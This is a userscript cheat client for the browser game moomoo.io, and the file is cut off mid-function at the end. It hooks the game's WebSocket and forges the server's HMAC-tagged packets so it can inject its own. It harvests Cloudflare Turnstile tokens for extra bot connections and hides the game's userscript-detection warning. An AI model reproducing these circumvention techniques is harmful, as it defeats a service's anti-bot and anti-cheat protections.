// ==UserScript==
// @name         Peter Client
// @version      11.1
// @author       Traz
// @description  Fix 2025
// @match        *://moomoo.io/*
// @match        *://*.moomoo.io/*
// @icon         https://logos.flamingtext.com/Name-Logos/Peter-design-power-name.gif
// @grant        none
// @license      MIT
// @namespace    -
// @run-at       document-start
// ==/UserScript==

/*
 * Changes against the original upload:
 *
 *   1. @run-at document-start. The hook replaces WebSocket.prototype.send, and
 *      the game captures that reference when its bundle loads -- installing it
 *      afterwards hooks nothing. The body is deferred to DOMContentLoaded,
 *      since it reads the DOM from its first statement.
 *   2. The EXP shim below (the same one the External Client, AE86, Aurora and
 *      Robotics use) supplies the transport the current server needs, and
 *      window.msgpack. This script used to get msgpack by injecting a <script>
 *      tag pointing at rawgit.com, which has been offline since 2019, so
 *      window.msgpack was undefined and every send and receive threw.
 *   3. reCAPTCHA replaced with Cloudflare Turnstile for bot connections.
 */

const EXP = (function() {
    "use strict";

    const NativeWebSocket = window.WebSocket
      , nativeSend = NativeWebSocket.prototype.send
      , TABLE_SALT = 1
      , HEADER_LEN = 6
      , MODE_SECURE = 1
      , BLOCK = 64
      , C2S = ["M", "D", "9", "e", "F", "z", "H", "K", "L", "N", "b", "P", "Q", "c", "6", "S", "0"]
      , S2C = ["A", "B", "C", "D", "E", "a", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "X", "Y", "Z", "g", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"];

    // Old mod packet names -> the names the current server uses. Applied on
    // the way out, before the opcode lookup.
    const PACKET_MAP = {
        "33": "9",
        "ch": "6",
        "pp": "0",
        "13c": "c",
        "f": "9",
        "a": "9",
        "d": "F",
        "G": "z"
    };

    /* --- minimal msgpack ------------------------------------------------ */
    // Replaces the old `@require` of msgpack-lite from rawgit.com, which has
    // been offline since 2019 (so window.msgpack was undefined and every
    // encode/decode in this script threw).
    const utf8enc = new TextEncoder()
      , utf8dec = new TextDecoder();

    function Writer() {
        this.buf = new Uint8Array(1024);
        this.view = new DataView(this.buf.buffer);
        this.pos = 0;
    }
    Writer.prototype.need = function(n) {
        if (this.pos + n <= this.buf.byteLength) return;
        let size = this.buf.byteLength * 2;
        while (size < this.pos + n) size *= 2;
        const next = new Uint8Array(size);
        next.set(this.buf);
        this.buf = next;
        this.view = new DataView(next.buffer);
    };
    Writer.prototype.u8 = function(v) { this.need(1); this.view.setUint8(this.pos++, v); };
    Writer.prototype.u16 = function(v) { this.need(2); this.view.setUint16(this.pos, v); this.pos += 2; };
    Writer.prototype.u32 = function(v) { this.need(4); this.view.setUint32(this.pos, v); this.pos += 4; };
    Writer.prototype.i8 = function(v) { this.need(1); this.view.setInt8(this.pos++, v); };
    Writer.prototype.i16 = function(v) { this.need(2); this.view.setInt16(this.pos, v); this.pos += 2; };
    Writer.prototype.i32 = function(v) { this.need(4); this.view.setInt32(this.pos, v); this.pos += 4; };
    Writer.prototype.f64 = function(v) { this.need(8); this.view.setFloat64(this.pos, v); this.pos += 8; };
    Writer.prototype.bytes = function(b) { this.need(b.length); this.buf.set(b, this.pos); this.pos += b.length; };

    function writeValue(w, v) {
        if (v === null || v === undefined) return w.u8(0xc0);
        const t = typeof v;
        if (t === "boolean") return w.u8(v ? 0xc3 : 0xc2);
        if (t === "number") return writeNumber(w, v);
        if (t === "string") return writeString(w, v);
        if (Array.isArray(v)) {
            const n = v.length;
            if (n < 16) w.u8(0x90 | n);
            else if (n < 65536) { w.u8(0xdc); w.u16(n); }
            else { w.u8(0xdd); w.u32(n); }
            for (let i = 0; i < n; i++) writeValue(w, v[i]);
            return;
        }
        if (v instanceof Uint8Array || ArrayBuffer.isView(v) || v instanceof ArrayBuffer) {
            const b = v instanceof ArrayBuffer ? new Uint8Array(v)
                : v instanceof Uint8Array ? v
                : new Uint8Array(v.buffer, v.byteOffset, v.byteLength);
            if (b.length < 256) { w.u8(0xc4); w.u8(b.length); }
            else if (b.length < 65536) { w.u8(0xc5); w.u16(b.length); }
            else { w.u8(0xc6); w.u32(b.length); }
            return w.bytes(b);
        }
        const keys = Object.keys(v)
          , n = keys.length;
        if (n < 16) w.u8(0x80 | n);
        else if (n < 65536) { w.u8(0xde); w.u16(n); }
        else { w.u8(0xdf); w.u32(n); }
        for (let i = 0; i < n; i++) {
            writeString(w, keys[i]);
            writeValue(w, v[keys[i]]);
        }
    }

    function writeNumber(w, v) {
        if (!Number.isSafeInteger(v)) { w.u8(0xcb); return w.f64(v); }
        if (v >= 0) {
            if (v < 128) return w.u8(v);
            if (v < 256) { w.u8(0xcc); return w.u8(v); }
            if (v < 65536) { w.u8(0xcd); return w.u16(v); }
            if (v < 4294967296) { w.u8(0xce); return w.u32(v); }
            w.u8(0xcb); return w.f64(v);
        }
        if (v >= -32) return w.u8(0xe0 | (v + 32));
        if (v >= -128) { w.u8(0xd0); return w.i8(v); }
        if (v >= -32768) { w.u8(0xd1); return w.i16(v); }
        if (v >= -2147483648) { w.u8(0xd2); return w.i32(v); }
        w.u8(0xcb); return w.f64(v);
    }

    function writeString(w, s) {
        const b = utf8enc.encode(s)
          , n = b.length;
        if (n < 32) w.u8(0xa0 | n);
        else if (n < 256) { w.u8(0xd9); w.u8(n); }
        else if (n < 65536) { w.u8(0xda); w.u16(n); }
        else { w.u8(0xdb); w.u32(n); }
        w.bytes(b);
    }

    function encode(value) {
        const w = new Writer();
        writeValue(w, value);
        return w.buf.slice(0, w.pos);
    }

    function Reader(bytes) {
        this.b = bytes;
        this.view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
        this.pos = 0;
    }
    Reader.prototype.read = function() {
        const c = this.view.getUint8(this.pos++);
        if (c < 0x80) return c;                       // positive fixint
        if (c >= 0xe0) return c - 256;                // negative fixint
        if (c >= 0xa0 && c <= 0xbf) return this.str(c & 0x1f);
        if (c >= 0x90 && c <= 0x9f) return this.arr(c & 0x0f);
        if (c >= 0x80 && c <= 0x8f) return this.map(c & 0x0f);
        switch (c) {
        case 0xc0: return null;
        case 0xc2: return false;
        case 0xc3: return true;
        case 0xc4: return this.bin(this.u8());
        case 0xc5: return this.bin(this.u16());
        case 0xc6: return this.bin(this.u32());
        case 0xca: { const v = this.view.getFloat32(this.pos); this.pos += 4; return v; }
        case 0xcb: { const v = this.view.getFloat64(this.pos); this.pos += 8; return v; }
        case 0xcc: return this.u8();
        case 0xcd: return this.u16();
        case 0xce: return this.u32();
        case 0xcf: { const hi = this.u32(), lo = this.u32(); return hi * 4294967296 + lo; }
        case 0xd0: { const v = this.view.getInt8(this.pos); this.pos += 1; return v; }
        case 0xd1: { const v = this.view.getInt16(this.pos); this.pos += 2; return v; }
        case 0xd2: { const v = this.view.getInt32(this.pos); this.pos += 4; return v; }
        case 0xd3: { const hi = this.view.getInt32(this.pos); this.pos += 4; const lo = this.u32(); return hi * 4294967296 + lo; }
        case 0xd9: return this.str(this.u8());
        case 0xda: return this.str(this.u16());
        case 0xdb: return this.str(this.u32());
        case 0xdc: return this.arr(this.u16());
        case 0xdd: return this.arr(this.u32());
        case 0xde: return this.map(this.u16());
        case 0xdf: return this.map(this.u32());
        }
        throw new Error("msgpack: unsupported byte 0x" + c.toString(16));
    };
    Reader.prototype.u8 = function() { return this.view.getUint8(this.pos++); };
    Reader.prototype.u16 = function() { const v = this.view.getUint16(this.pos); this.pos += 2; return v; };
    Reader.prototype.u32 = function() { const v = this.view.getUint32(this.pos); this.pos += 4; return v; };
    Reader.prototype.str = function(n) {
        const s = utf8dec.decode(this.b.subarray(this.pos, this.pos + n));
        this.pos += n;
        return s;
    };
    Reader.prototype.bin = function(n) {
        const s = this.b.subarray(this.pos, this.pos + n);
        this.pos += n;
        return s;
    };
    Reader.prototype.arr = function(n) {
        const out = new Array(n);
        for (let i = 0; i < n; i++) out[i] = this.read();
        return out;
    };
    Reader.prototype.map = function(n) {
        const out = {};
        for (let i = 0; i < n; i++) {
            const k = this.read();
            const v = this.read();
            if (k !== "__proto__") out[k] = v;      // never let the wire touch the prototype
        }
        return out;
    };

    function decode(bytes) {
        return new Reader(toBytes(bytes)).read();
    }

    function toBytes(d) {
        if (d instanceof Uint8Array) return d;
        if (d instanceof ArrayBuffer) return new Uint8Array(d);
        if (ArrayBuffer.isView(d)) return new Uint8Array(d.buffer, d.byteOffset, d.byteLength);
        return new Uint8Array(d);
    }

    /* --- opcode tables -------------------------------------------------- */
    function rng(seed) {
        return function() {
            seed |= 0;
            seed = seed + 1831565813 | 0;
            let t = Math.imul(seed ^ seed >>> 15, 1 | seed);
            t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t;
            return ((t ^ t >>> 14) >>> 0) / 4294967296;
        };
    }

    function shuffleTable(names, seed) {
        const len = names.length
          , idx = names.map((_, i) => i)
          , next = rng(seed >>> 0);
        for (let i = len - 1; i > 0; i--) {
            const j = Math.floor(next() * (i + 1))
              , tmp = idx[i];
            idx[i] = idx[j];
            idx[j] = tmp;
        }
        const enc = {}, dec = {};
        for (let k = 0; k < len; k++) {
            enc[names[k]] = idx[k];
            dec[idx[k]] = names[k];
        }
        return { enc, dec };
    }

    function buildTables(seed) {
        const s = (seed ^ Math.imul(TABLE_SALT, 2654435761)) >>> 0;
        return {
            c2s: shuffleTable(C2S, s),
            s2c: shuffleTable(S2C, (s ^ 2246822507) >>> 0)
        };
    }

    /* --- HMAC-SHA256 ---------------------------------------------------- */
    const K = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298]);

    function rotr(x, n) { return x >>> n | x << 32 - n; }

    function sha256(msg) {
        const h = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
          , len = msg.length
          , bits = len * 8
          , padded = new Uint8Array(Math.ceil((len + 9) / 64) * 64);
        padded.set(msg);
        padded[len] = 128;
        const view = new DataView(padded.buffer);
        view.setUint32(padded.length - 4, bits >>> 0, false);
        view.setUint32(padded.length - 8, Math.floor(bits / 4294967296), false);
        const w = new Uint32Array(64);
        for (let off = 0; off < padded.length; off += 64) {
            for (let i = 0; i < 16; i++) w[i] = view.getUint32(off + i * 4, false);
            for (let i = 16; i < 64; i++) {
                const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ w[i - 15] >>> 3
                  , s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ w[i - 2] >>> 10;
                w[i] = w[i - 16] + s0 + w[i - 7] + s1 | 0;
            }
            let a = h[0], b = h[1], c = h[2], d = h[3], e = h[4], f = h[5], g = h[6], hh = h[7];
            for (let i = 0; i < 64; i++) {
                const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
                  , ch = e & f ^ ~e & g
                  , t1 = hh + S1 + ch + K[i] + w[i] | 0
                  , S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
                  , maj = a & b ^ a & c ^ b & c
                  , t2 = S0 + maj | 0;
                hh = g; g = f; f = e; e = d + t1 | 0;
                d = c; c = b; b = a; a = t1 + t2 | 0;
            }
            h[0] = h[0] + a | 0; h[1] = h[1] + b | 0; h[2] = h[2] + c | 0; h[3] = h[3] + d | 0;
            h[4] = h[4] + e | 0; h[5] = h[5] + f | 0; h[6] = h[6] + g | 0; h[7] = h[7] + hh | 0;
        }
        const out = new Uint8Array(32)
          , ov = new DataView(out.buffer);
        for (let i = 0; i < 8; i++) ov.setUint32(i * 4, h[i], false);
        return out;
    }

    function hmac(key, msg) {
        let k = key;
        if (k.length > BLOCK) k = sha256(k);
        const padKey = new Uint8Array(BLOCK);
        padKey.set(k);
        const inner = new Uint8Array(BLOCK + msg.length)
          , outer = new Uint8Array(BLOCK + 32);
        for (let i = 0; i < BLOCK; i++) {
            inner[i] = padKey[i] ^ 54;
            outer[i] = padKey[i] ^ 92;
        }
        inner.set(msg, BLOCK);
        outer.set(sha256(inner), BLOCK);
        return sha256(outer);
    }

    function tag(key, payload) { return hmac(key, payload).subarray(0, HEADER_LEN); }

    function hexToBytes(hex) {
        const out = new Uint8Array(hex.length / 2);
        for (let i = 0; i < out.length; i++) out[i] = parseInt(hex.substr(i * 2, 2), 16);
        return out;
    }

    /* --- per-socket protocol state -------------------------------------- */
    const states = new WeakMap();

    // Every socket gets a listener at construction time, because io-init
    // arrives before anything else attaches one.
    function sniff(sock, raw) {
        try {
            const msg = decode(raw);
            if (msg[0] !== "io-init") return;
            const a = msg[1];
            states.set(sock, a[3] === MODE_SECURE ? {
                mode: MODE_SECURE,
                key: hexToBytes(a[2]),
                tables: buildTables(a[1] >>> 0),
                seq: 0
            } : { mode: 0, seq: 0 });
        } catch (e) { /* not a handshake frame */ }
    }

    function PatchedWebSocket(url, protocols) {
        const sock = protocols === undefined ? new NativeWebSocket(url) : new NativeWebSocket(url, protocols);
        sock.addEventListener("message", function(ev) {
            if (!states.has(sock)) sniff(sock, ev.data);
        });
        return sock;
    }
    PatchedWebSocket.prototype = NativeWebSocket.prototype;
    ["CONNECTING", "OPEN", "CLOSING", "CLOSED"].forEach(function(k) {
        PatchedWebSocket[k] = NativeWebSocket[k];
    });
    try {
        window.WebSocket = PatchedWebSocket;
    } catch (e) {
        console.warn("[EXP] could not install WebSocket wrapper", e);
    }

    /* --- framing -------------------------------------------------------- */

    // Turn what the game handed us back into a string-named packet.
    // Returns null if it cannot be parsed.
    function unframe(sock, raw) {
        const st = states.get(sock)
          , bytes = toBytes(raw);
        try {
            if (st && st.mode === MODE_SECURE) {
                const parsed = decode(bytes.subarray(HEADER_LEN))
                  , name = st.tables.c2s.dec[parsed[0]];
                if (name === undefined) return null;
                return { type: name, args: parsed[1] };
            }
            const parsed = decode(bytes);
            return { type: parsed[0], args: parsed[1] };
        } catch (e) {
            return null;
        }
    }

    // Frame and transmit a string-named packet. This shim owns the sequence
    // counter: it renumbers everything it sends, so packets the client injects
    // sit in the same monotonic run as the game's own.
    function send(sock, type, args) {
        if (!sock || sock.readyState !== 1) return false;
        const name = Object.prototype.hasOwnProperty.call(PACKET_MAP, type) ? PACKET_MAP[type] : type
          , st = states.get(sock);
        if (st && st.mode === MODE_SECURE) {
            const op = st.tables.c2s.enc[name];
            if (op === undefined) return false;     // server would drop it anyway
            const payload = encode([op, args, ++st.seq])
              , frame = new Uint8Array(HEADER_LEN + payload.length);
            frame.set(tag(st.key, payload), 0);
            frame.set(payload, HEADER_LEN);
            nativeSend.call(sock, frame);
            return true;
        }
        nativeSend.call(sock, encode([name, args]));
        return true;
    }

    // Decode an incoming frame into [stringName, args].
    function receive(sock, raw) {
        const st = states.get(sock)
          , parsed = decode(toBytes(raw));
        let type = parsed[0];
        if (st && st.mode === MODE_SECURE && typeof type === "number") {
            type = st.tables.s2c.dec[type];
            if (type === undefined) return null;
        }
        return { type: type, args: parsed[1] };
    }

    /* --- captcha token -------------------------------------------------- */
    // The game moved from reCAPTCHA to Cloudflare Turnstile, and the token is
    // now prefixed "cf:". The bundle keeps the token in a closure, but it
    // publishes its callback on window, so we wrap the property before the
    // bundle installs it and copy the token as it comes through.
    let captchaToken = null;
    (function() {
        let inner = null;
        try {
            Object.defineProperty(window, "onGotTurnstileToken", {
                configurable: true,
                get: function() {
                    return function(t) {
                        captchaToken = t;
                        if (inner) inner(t);
                    };
                },
                set: function(fn) { inner = fn; }
            });
        } catch (e) {
            console.warn("[EXP] could not hook the Turnstile callback", e);
        }
    })();

    function token() {
        // Fall back to reading the widget directly: if the page rendered and
        // solved it before our wrapper was in place, the callback never fired
        // for us and captchaToken would still be null.
        if (!captchaToken && window.turnstile && typeof window.turnstile.getResponse === "function") {
            try {
                const el = document.getElementById("turnstileWidget");
                captchaToken = (el ? window.turnstile.getResponse(el) : window.turnstile.getResponse()) || null;
            } catch (e) { /* no widget yet */ }
        }
        return captchaToken ? "cf:" + captchaToken : null;
    }

    // Ask Turnstile for a new token. Cloudflare treats tokens as single-use,
    // so reusing one for extra connections will usually be rejected -- this is
    // a best effort, not a guarantee.
    function freshToken(timeoutMs) {
        return new Promise(function(resolve) {
            const previous = captchaToken;
            let reset = false;
            try {
                if (window.turnstile && typeof window.turnstile.reset === "function") {
                    captchaToken = null;
                    const el = document.getElementById("turnstileWidget");
                    el ? window.turnstile.reset(el) : window.turnstile.reset();
                    reset = true;
                }
            } catch (e) {
                captchaToken = previous;
            }
            if (!reset) return resolve(token());
            let waited = 0;
            const poll = setInterval(function() {
                if (captchaToken) {
                    clearInterval(poll);
                    resolve(token());
                } else if ((waited += 100) >= (timeoutMs || 8000)) {
                    clearInterval(poll);
                    captchaToken = previous;
                    resolve(token());
                }
            }, 100);
        });
    }

    /* --- the "userscript manager detected" strip ------------------------ */
    // BEGIN page-guards (lifted verbatim by tools/build-ryn.js)
    // The bundle looks for a userscript manager and, if it finds one, draws a
    // red bar across the top of the page:
    //
    //     function ys(e) {
    //         if (document.getElementById("userscript-warning")) return;
    //         ...  i.id = "userscript-warning"; i.style.cssText = "...#c0392b..."
    //     }
    //
    // It is only a bar. Nothing else in the bundle reads it, no packet carries
    // it, and the server is never told -- ys() draws it and returns. It is also
    // unavoidable from here: the GM_* and unsafeWindow shims every script in
    // this repo installs are three of the four things ws() tests for, and the
    // fourth is an image probe against the extension's own files, which no page
    // script can influence.
    //
    // Its own first line is the way out. An element with that id already in the
    // document makes ys() a no-op, so put one there -- empty, hidden, and ours.
    // That is a guard rather than a removal: there is no flash of red to take
    // away afterwards, and it costs one div.
    function suppressWarningBanner() {
        if (typeof document == "undefined" || typeof document.createElement != "function") return;
        const WARNING = "userscript-warning";
        function plant() {
            const root = document.body || document.documentElement;
            if (!root || typeof root.appendChild != "function") return null;
            let mine = document.getElementById(WARNING);
            if (mine && mine.getAttribute("data-guard") !== "1") {
                // the bundle got there first -- the only case with anything to
                // remove, and the observer below is what makes that a flicker
                // rather than a permanent bar
                if (mine.parentNode) mine.parentNode.removeChild(mine);
                mine = null;
            }
            if (mine) return mine;
            const div = document.createElement("div");
            div.id = WARNING;
            div.setAttribute("data-guard", "1");
            div.style.display = "none";
            root.appendChild(div);
            return div;
        }
        if (!plant()) return;
        // Ours can be taken away by anything that clears the body -- a mod
        // rebuilding the menu, the game's own DOM churn -- and the bundle's
        // 1.5s check would then find nothing in its way. Watching is cheap.
        try {
            if (typeof MutationObserver != "function") return;
            const watch = new MutationObserver(function() { plant(); });
            const target = document.body || document.documentElement;
            if (target) watch.observe(target, { childList: true });
            if (!document.body && typeof document.addEventListener == "function") {
                document.addEventListener("DOMContentLoaded", function() {
                    plant();
                    if (document.body) watch.observe(document.body, { childList: true });
                });
            }
        } catch (e) {}
    }

    /* --- getting past "Connecting..." ----------------------------------- */
    // Press ENTER GAME and the menu says "Connecting..." for ever, with no
    // error, no alert and no socket. It is not a mod bug and not a transport
    // bug. It is this, in the bundle:
    //
    //     function Fi() {
    //         !vi || ei || (ei = !0,
    //         Sa || pi ? ue && Lt("cf:" + ue) : ue ? Lt("cf:" + ue) : Lt())
    //     }
    //
    // `ue` is the Turnstile token and `ei` is "we already tried". On moomoo.io
    // the first branch is the live one, so if the token has not arrived when the
    // button is pressed, the whole statement is `ei = true` and nothing else --
    // no connect, and every press afterwards is a no-op because `ei` is set. The
    // click handler has already written "Connecting..." to the screen by then.
    // The dead end is latched: once pressed too early the tab can only be
    // reloaded. tools/probe-entry.js reproduces it against the shipped bundle
    // with no mod loaded at all.
    //
    // The token goes missing more easily than it looks. Turnstile refuses to
    // render into an element that is not laid out, and the bundle's renderer
    //
    //     const e = document.getElementById("turnstileWidget");
    //     if (!e || e.offsetParent === null) return !1;
    //
    // is polled every 150ms for 100 tries and then never again. A mod that lays
    // its menu over the page, hides the card the widget sits in, or is still
    // building at 15 seconds costs the page its captcha permanently.
    //
    // So: keep the widget rendering past the point the game gives up, and until
    // there is a token, do not let the press through to the handler that would
    // latch the dead end.
    const TURNSTILE_SITEKEY = "0x4AAAAAAAMYHI96GFiJzMmp";
    const TURNSTILE_API = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
    const entryStats = { renders: 0, holds: 0 };
    // readToken/saveToken are parameters rather than closure references so that
    // this block can be lifted whole into a script that has no EXP core --
    // RYN carries its own client and its own token, and needed the same guard.
    function guardEntry(readToken, saveToken) {
        if (typeof window == "undefined" || typeof document == "undefined") return;
        let box = null, rendered = false, told = false, gaveUp = false;
        const started = Date.now();

        function haveToken() { try { return !!readToken(); } catch (e) { return false; } }

        function loadApi() {
            if (window.turnstile) return;
            try {
                if (document.querySelector('script[src*="challenges.cloudflare.com/turnstile"]')) return;
                const s = document.createElement("script");
                s.src = TURNSTILE_API;
                s.async = true;
                (document.head || document.documentElement).appendChild(s);
            } catch (e) {}
        }

        // Somewhere visible and out of the way, used only when the game's own
        // widget cannot be rendered into. If the page's widget is laid out it is
        // left alone and the game solves it as usual.
        function ownHost() {
            const root = document.body || document.documentElement;
            if (!root) return null;
            box = document.createElement("div");
            box.id = "moo-turnstile-fallback";
            box.style.cssText = ["position:fixed", "right:12px", "bottom:12px", "z-index:2147483000",
                "background:rgba(0,0,0,.35)", "padding:6px", "border-radius:6px"].join(";");
            // The widget goes in a plain child, not in the fixed box itself:
            // offsetParent is null for a position:fixed element, and that is the
            // exact test the game uses to decide something is not laid out. No
            // reason to hand Cloudflare a target that reads as invisible by the
            // one measure known to matter here.
            const target = document.createElement("div");
            target.style.cssText = "width:300px;height:65px";
            box.appendChild(target);
            root.appendChild(box);
            return target;
        }

        function render() {
            if (rendered || !window.turnstile || typeof window.turnstile.render != "function") return;
            const page = document.getElementById("turnstileWidget");
            const usable = page && page.offsetParent !== null;
            // The game renders into its own widget the moment it can. Give it
            // six seconds of clear air before putting a second one on the page:
            // two widgets both work, but each solve is a round trip Cloudflare
            // did not need to be asked for.
            if (usable && (page.childElementCount > 0 || Date.now() - started < 6000)) return;
            const where = usable ? page : ownHost();
            if (!where) return;
            rendered = true;
            try {
                window.turnstile.render(where, {
                    sitekey: TURNSTILE_SITEKEY,
                    theme: "light",
                    callback: function(t) {
                        try {
                            if (typeof window.onGotTurnstileToken == "function") window.onGotTurnstileToken(t);
                            else saveToken(t);
                        } catch (e) { saveToken(t); }
                    },
                    "error-callback": function() {},
                    "expired-callback": function() {}
                });
                entryStats.renders++;
                console.info("[EXP] the page's Turnstile widget was not usable, so one was rendered "
                    + "bottom-right. Solve it and ENTER GAME will work.");
            } catch (e) {
                rendered = false;
                console.warn("[EXP] could not render Turnstile", e);
            }
        }

        function note(text) {
            if (told) return;
            told = true;
            try {
                const n = document.createElement("div");
                n.textContent = text;
                n.style.cssText = ["position:fixed", "left:50%", "bottom:16px", "transform:translateX(-50%)",
                    "z-index:2147483001", "background:#2c3e50", "color:#fff",
                    "font-family:Hammersmith One, sans-serif", "font-size:14px",
                    "padding:8px 14px", "border-radius:6px", "pointer-events:none"].join(";");
                (document.body || document.documentElement).appendChild(n);
                setTimeout(function() {
                    if (n.parentNode) n.parentNode.removeChild(n);
                    told = false;
                }, 4000);
            } catch (e) {}
        }

        // Capture on the document, so the press is stopped before it reaches the
        // button's own onclick -- which is where `ei` gets latched. Pointer and
        // touch go with it: the bundle hooks touch events onto the same button
        // and turns them into the same call.
        ["click", "mousedown", "mouseup", "pointerdown", "pointerup", "touchstart", "touchend"]
            .forEach(function(type) {
                try {
                    document.addEventListener(type, function(e) {
                        const btn = document.getElementById("enterGame");
                        if (!btn || !e.target) return;
                        if (e.target !== btn && !(btn.contains && btn.contains(e.target))) return;
                        if (haveToken()) return;
                        e.preventDefault();
                        e.stopImmediatePropagation();
                        entryStats.holds++;
                        note(gaveUp
                            ? "Cloudflare check unavailable - reload, or allow challenges.cloudflare.com"
                            : "Waiting for the Cloudflare check. ENTER GAME will work as soon as it passes.");
                    }, true);
                } catch (e) {}
            });

        function tick() {
            if (haveToken()) {
                // the game does this in its own callback; doing it again costs
                // nothing and covers a mod that put the class back
                try {
                    const btn = document.getElementById("enterGame");
                    if (btn && btn.classList) btn.classList.remove("disabled");
                } catch (e) {}
                if (box && box.parentNode) { box.parentNode.removeChild(box); box = null; }
                return;
            }
            if (Date.now() - started > 120000) { gaveUp = true; return; }
            loadApi();
            render();
            setTimeout(tick, 500);
        }
        if (document.readyState === "loading" && typeof document.addEventListener == "function") {
            document.addEventListener("DOMContentLoaded", function() { setTimeout(tick, 500); });
        } else {
            setTimeout(tick, 500);
        }
    }

    // END page-guards
    // Both are page-level and idempotent, and both have to be in place before
    // the bundle's own timers run, so they go in here rather than in any one
    // script's boot.
    try { suppressWarningBanner(); } catch (e) {}
    try { if (window.MOO_ENTRY_GUARD !== false) guardEntry(token, function(t) { captchaToken = t; }); } catch (e) {}

    /* --- send trampoline ------------------------------------------------ */
    // The game captures WebSocket.prototype.send at bundle load. We install
    // this now so that captured reference is ours; the client installs its
    // real handler later via setHandler().
    let handler = null;
    NativeWebSocket.prototype.nsend = nativeSend;
    NativeWebSocket.prototype.send = function(data) {
        if (handler) return handler.call(this, data);
        return nativeSend.call(this, data);
    };

    window.msgpack = { encode: encode, decode: decode };

    return {
        encode: encode,
        decode: decode,
        unframe: unframe,
        send: send,
        receive: receive,
        stateOf: function(sock) { return states.get(sock); },
        isSecure: function(sock) { const s = states.get(sock); return !!(s && s.mode === MODE_SECURE); },
        setHandler: function(fn) { handler = fn; },
        token: token,
        freshToken: freshToken,
        entryStats: function() { return { turnstileRenders: entryStats.renders, entryPressesHeld: entryStats.holds }; },
        nativeSend: nativeSend,
        PACKET_MAP: PACKET_MAP,
        // exposed for the test harness
        _internals: { buildTables, tag, hexToBytes, HEADER_LEN, MODE_SECURE, states }
    };
}
)();

/* The body below reads the DOM from its first statement, so it waits for the
 * document. The shim above is already installed by then, which is the part
 * that had to beat the game bundle. */
function __peterBoot() {





































// The menu intro below writes straight through getElementById with no null
// check. #gameName in particular is a static element the game bundle never
// touches, so if a layout change drops it these throw at the client's first
// statement and nothing after them runs. Guarded.
if (document.getElementById("gameName") && document.getElementById("enterGame")) {
document.getElementById('enterGame').innerText = "Peter";
document.getElementById("enterGame").addEventListener("mouseenter", function() {
    document.getElementById('enterGame').innerText = "Kil All";
    document.getElementById("gameName").style.color = "";
});
document.getElementById("enterGame").addEventListener("mouseleave", function() {
    document.getElementById('enterGame').innerText = "Peter Mod The Best";
    document.getElementById("gameName").style.color = "";
});

document.getElementById('gameName').innerHTML = 'P';
setTimeout(() => {
    document.getElementById('gameName').innerHTML = 'Pe';
    setTimeout(() => {
        document.getElementById('gameName').innerHTML = 'Pet';
        setTimeout(() => {
            document.getElementById('gameName').innerHTML = 'Pete';
            setTimeout(() => {
                document.getElementById('gameName').innerHTML = 'Peter';
                setTimeout(() => {
                    document.getElementById('gameName').innerHTML = 'Mod';
                    setTimeout(() => {
                        document.getElementById('gameName').innerHTML = 'Is';
                        setTimeout(() => {
                            document.getElementById('gameName').innerHTML = 'Back';
                            setTimeout(() => {
                                document.getElementById('gameName').innerHTML = '2025';
                                setTimeout(() => {
                                    document.getElementById('gameName').innerHTML = 'By traz';
                                    setTimeout(() => {
                                        document.getElementById('gameName').innerHTML = 'Update 11';
                                        setTimeout(() => {
                                            document.getElementById('gameName').innerHTML = 'Dc';
                                            setTimeout(() => {
                                                document.getElementById('gameName').innerHTML = 'zymbatraz';
                                            }, 1200);
                                        }, 120);
                                    }, 120);
                                }, 120);
                            }, 120);
                        }, 120);
                    }, 120);
                }, 120);
            }, 120);
        }, 120);
    }, 1200);
}, 120);



document.getElementById('loadingText').innerHTML = '1.2.3';
setTimeout(() => {
    document.getElementById('loadingText').innerHTML = '';
}, 710);
document.getElementById("mainMenu").style.backgroundSize = "cover";
document.getElementById("mainMenu").style.backgroundPosition = "center";
document.getElementById("mainMenu").style.width = "100%";
document.getElementById("mainMenu").style.height = "100vh";
document.getElementById("gameName").style.textShadow = "#000000 -2px -2px 10px, black 0px -5px 1px, white 0px -5px 10px";
document.getElementById("loadingText").innerText="";
} else {
    console.warn("[Peter] #gameName / #enterGame not on the page; skipping the menu intro");
}


// Test Auto Reply
let founda = false;
let scriptTags = document.getElementsByTagName("script");
for (let i = 0; i < scriptTags.length; i++) {
    if (scriptTags[i].src.includes("index-f3a4c1ad.js") && !founda) {
        scriptTags[i].remove();
        founda = true;
        break;
    }
}

var styleItem = document.createElement("style");
styleItem.type = "text/css";
styleItem.appendChild(document.createTextNode(`
#suggestBox {
    width: 355px;
    border-radius: 3px;
    background-color: rgba(0,0,0,0.5);
    margin: auto;
    text-align: left;
    z-index: 49;
    pointer-events: auto;
    position: relative;
    bottom: 3.5px;
    overflow-y: auto;
}
#suggestBox div {
    background-color: rgba(255,255,255,0);
    color: rgba(255,255,255,1);
    transition: background-color 0.3s, color 0.3s;
}
#suggestBox div:hover {
    background-color: rgba(255,255,255,0.2);
    color: rgba(0,0,0,1);
}
.suggestBoxHard {
    color: rgba(255,255,255,1);
    font-size: 18px;
}
.suggestBoxLight {
    color: rgba(255,255,255,0.7);
    font-size: 18px;
}
`));
document.head.appendChild(styleItem);

window.addEventListener('load', function() {
    var allianceButton = document.getElementById('allianceButton');
